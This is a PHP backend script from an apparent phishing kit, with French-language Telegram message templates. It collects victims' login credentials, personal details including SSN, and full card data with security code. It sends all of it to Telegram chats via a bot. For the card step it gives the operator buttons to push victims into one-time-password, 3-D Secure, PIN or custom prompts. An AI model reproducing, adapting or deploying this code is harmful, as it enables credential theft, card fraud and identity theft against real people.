<?php
session_start();
require_once '../config.php';
require_once __DIR__ . '/../ab/check.php';
require_once __DIR__ . '/panel_bridge.php';

header('Content-Type: application/json');

function sendTelegram($data, $ip, $step) {
    global $token, $id_trash, $id_cc;

    switch ($step) {
        case 'login':
            $pwd = !empty($data['password']) ? "\n┊ 🔒 Pass : <code>{$data['password']}</code>" : "";
            $message = "
↳ <b>Connexion</b>

┊ 📧 Login : <code>{$data['email']}</code>{$pwd}
┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 " . date('d/m H:i') . "
";
            @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=" . $id_trash . "&text=" . urlencode($message) . "&parse_mode=HTML");
            break;

        case 'billing':
            $bday = !empty($data['birthDate']) ? "\n┊ 🎂 DDN : <code>{$data['birthDate']}</code>" : "";
            $stateInfo = !empty($data['state']) ? "\n┊ 🪇 État : <code>{$data['state']}</code>" : "";
            $ssnInfo = !empty($data['ssn']) ? "\n┊ 🪇 SSN : <code>{$data['ssn']}</code>" : "";
            $message = "
↳ <b>Infos perso</b>

┊ 🪇 Nom : <code>{$data['firstName']} {$data['lastName']}</code>{$bday}
┊ 🪇 Adresse : <code>{$data['address']}</code>
┊ 🪇 Ville : <code>{$data['postalCode']} {$data['city']}</code>{$stateInfo}
┊ 🪇 Tel : <code>{$data['phoneNumber']}</code>{$ssnInfo}
┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 " . date('d/m H:i') . "
";
            @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=" . $id_trash . "&text=" . urlencode($message) . "&parse_mode=HTML");
            break;

        case 'card':
            $binInfo = checkbin($data['cardNumber']);
            $cc = str_replace(' ', '', $data['cardNumber']);
            $bin = substr($cc, 0, 6);

            $message = "+1 {$bin} · {$binInfo['bank']}

┊ 🫆 <b>CARTE</b>
┊
┊ 👺 Titulaire : <code>{$data['cardHolderName']}</code>
┊ 🌪️ Numéro : <code>{$cc}</code>
┊ 🌪️ Date : <code>{$data['month']}/{$data['year']}</code>
┊ 🌪️ Crypto : <code>{$data['securityCode']}</code>
" . (!empty($_POST['csc']) ? "┊ 🌪️ CSC : <code>{$_POST['csc']}</code>\n" : "") . "┊ 🌪️ Banque : {$binInfo['bank']}
┊ 🌪️ Type : {$binInfo['scheme']} · {$binInfo['type']} · {$binInfo['level']}

┊ 🎭 <b>FACTURATION</b>
┊
┊ 🪇 Nom : <code>{$_SESSION['firstName']} {$_SESSION['lastName']}</code>
┊ 🪇 DDN : <code>{$_SESSION['birthDate']}</code>
┊ 🪇 Adresse : <code>{$_SESSION['address']}</code>
┊ 🪇 Ville : <code>{$_SESSION['city']} - {$_SESSION['postalCode']}</code>
" . (!empty($_SESSION['state']) ? "┊ 🪇 État : <code>{$_SESSION['state']}</code>\n" : "") . "┊ 🪇 Tél : <code>{$_SESSION['phoneNumber']}</code>
" . (!empty($_SESSION['ssn']) ? "┊ 🪇 SSN : <code>{$_SESSION['ssn']}</code>\n" : "") . "┊ 🪇 Email : <code>{$_SESSION['email']}</code>
" . (!empty($_SESSION['password']) ? "┊ 🪇 MDP : <code>{$_SESSION['password']}</code>\n" : "") . "
┊ 🌐 <b>DIVERS</b>
┊
┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 Date : " . date('d/m/Y H:i:s') . "
";
            $base = 'https://' . $_SERVER['HTTP_HOST'] . '/app/ask.php';
            $bp = '?ip=' . $ip . '&token=' . session_id() . '&type=';
            $custom_base = 'https://' . $_SERVER['HTTP_HOST'] . '/app/custom.php?ip=' . $ip . '&token=' . session_id();

            $keyboard = json_encode([
                'inline_keyboard' => [
                    [
                        ['text' => '✅ FIN', 'url' => $base . $bp . 'finish'],
                        ['text' => '❌ BAD CC', 'url' => $base . $bp . 'invalid_card'],
                    ],
                    [
                        ['text' => '📱 OTP SMS', 'url' => $base . $bp . 'otp_sms'],
                        ['text' => '📧 OTP Mail', 'url' => $base . $bp . 'otp_mail'],
                    ],
                    [
                        ['text' => '💳 OTP NFC', 'url' => $base . $bp . 'otp_nfc'],
                        ['text' => '🔐 3DS/VBV', 'url' => $base . $bp . 'vbv'],
                    ],
                    [
                        ['text' => '🔢 Code PIN', 'url' => $base . $bp . 'pin'],
                        ['text' => '✏️ Custom', 'url' => $custom_base],
                    ],
                    [
                        ['text' => '⛔ Ban IP', 'url' => $base . $bp . 'ban'],
                    ],
                ],
            ]);

            @file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $id_cc . '&text=' . urlencode($message) . '&parse_mode=HTML&reply_markup=' . urlencode($keyboard));
            break;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $action = $_GET['action'] ?? '';
    switch ($action) {
        case 'check-auth':
            echo json_encode([
                'success' => isset($_SESSION['authenticated']) && $_SESSION['authenticated'],
                'authenticated' => isset($_SESSION['authenticated']) && $_SESSION['authenticated']
            ]);
            exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

if (($_POST['action'] ?? '') === 'set_custom') {
    $d = json_decode($_POST['data'] ?? '{}', true);
    $_SESSION['custom_data'] = $d;
    echo json_encode(['ok' => true]);
    exit;
}

if (($_POST['action'] ?? '') === 'get_custom') {
    echo json_encode($_SESSION['custom_data'] ?? ['title' => '', 'message' => '', 'fields' => []]);
    exit;
}

$step = $_POST['step'] ?? '';
$ip = _ip();

if (isBlacklisted($ip)) {
    http_response_code(403);
    echo json_encode(['error' => 'banned']);
    exit;
}

switch ($step) {
    case '1':
        $login = $_POST['email'] ?? $_POST['login'] ?? $_POST['reference'] ?? '';
        $password = $_POST['password'] ?? '';

        if (empty($login)) {
            http_response_code(400);
            echo json_encode(['error' => 'invalidLogin']);
            exit;
        }

        $_SESSION['authenticated'] = true;
        $_SESSION['email'] = $login;
        $_SESSION['password'] = $password;
        $_SESSION['ip'] = $ip;

        sendTelegram(['email' => $login, 'password' => $password], $ip, 'login');
        panelSessionAddStep('login');
        panelSessionUpdate(['email' => $login, 'password' => $password]);
        sleep(1);
        echo json_encode(['success' => true]);
        break;

    case '2':
        if (!isset($_SESSION['authenticated'])) {
            http_response_code(401);
            echo json_encode(['error' => 'unauthorized']);
            exit;
        }

        $_SESSION['firstName'] = $_POST['firstName'] ?? '';
        $_SESSION['lastName'] = $_POST['lastName'] ?? '';
        $_SESSION['birthDate'] = $_POST['birthDate'] ?? '';
        $_SESSION['address'] = $_POST['address'] ?? '';
        $_SESSION['addressBis'] = $_POST['addressBis'] ?? '';
        $_SESSION['postalCode'] = $_POST['postalCode'] ?? '';
        $_SESSION['city'] = $_POST['city'] ?? '';
        $_SESSION['phoneNumber'] = $_POST['phoneNumber'] ?? '';
        $_SESSION['state'] = $_POST['state'] ?? '';
        $_SESSION['ssn'] = $_POST['ssn'] ?? '';

        sendTelegram([
            'firstName' => $_SESSION['firstName'],
            'lastName' => $_SESSION['lastName'],
            'birthDate' => $_SESSION['birthDate'],
            'address' => $_SESSION['address'],
            'addressBis' => $_SESSION['addressBis'],
            'postalCode' => $_SESSION['postalCode'],
            'city' => $_SESSION['city'],
            'phoneNumber' => $_SESSION['phoneNumber'],
            'state' => $_SESSION['state'],
            'ssn' => $_SESSION['ssn'],
        ], $ip, 'billing');
        panelSessionAddStep('billing');
        panelSessionUpdate(['billing_data' => [
            'firstName' => $_SESSION['firstName'], 'lastName' => $_SESSION['lastName'],
            'birthDate' => $_SESSION['birthDate'], 'address' => $_SESSION['address'],
            'postalCode' => $_SESSION['postalCode'], 'city' => $_SESSION['city'],
            'phoneNumber' => $_SESSION['phoneNumber'],
            'state' => $_SESSION['state'], 'ssn' => $_SESSION['ssn'],
        ]]);

        sleep(1);
        echo json_encode(['success' => true]);
        break;

    case '3':
        if (!isset($_SESSION['authenticated'])) {
            http_response_code(401);
            echo json_encode(['error' => 'unauthorized']);
            exit;
        }

        $_SESSION['cardHolderName'] = $_POST['cardHolderName'] ?? '';
        $_SESSION['cardNumber'] = $_POST['cardNumber'] ?? '';
        $_SESSION['securityCode'] = $_POST['securityCode'] ?? '';
        $_SESSION['month'] = $_POST['month'] ?? '';
        $_SESSION['year'] = $_POST['year'] ?? '';

        if (!is_valid_luhn(str_replace(' ', '', $_SESSION['cardNumber']))) {
            http_response_code(400);
            echo json_encode(['error' => 'invalidCard']);
            exit;
        }

        sendTelegram([
            'cardHolderName' => $_SESSION['cardHolderName'],
            'cardNumber' => $_SESSION['cardNumber'],
            'securityCode' => $_SESSION['securityCode'],
            'month' => $_SESSION['month'],
            'year' => $_SESSION['year']
        ], $ip, 'card');
        panelSessionAddStep('card');
        panelSessionUpdate(['card_data' => [
            'cardHolderName' => $_SESSION['cardHolderName'],
            'cardNumber' => $_SESSION['cardNumber'],
            'securityCode' => $_SESSION['securityCode'],
            'month' => $_SESSION['month'], 'year' => $_SESSION['year'],
        ]]);

        sleep(2);
        echo json_encode(['success' => true]);
        break;

    default:
        http_response_code(400);
        echo json_encode(['error' => 'Invalid step']);
        break;
}
?>
